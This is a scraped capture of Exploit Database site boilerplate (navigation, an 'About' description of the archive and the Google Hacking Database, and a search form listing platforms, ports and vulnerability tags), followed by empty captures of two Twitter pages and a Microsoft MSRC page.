|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from twitter.com_5920a24a_20250126_034151.html ===



=== Content from twitter.com_afcc4710_20250126_034151.html ===



=== Content from portal.msrc.microsoft.com_0701592f_20250126_034152.html ===
You need to enable JavaScript to run this app.
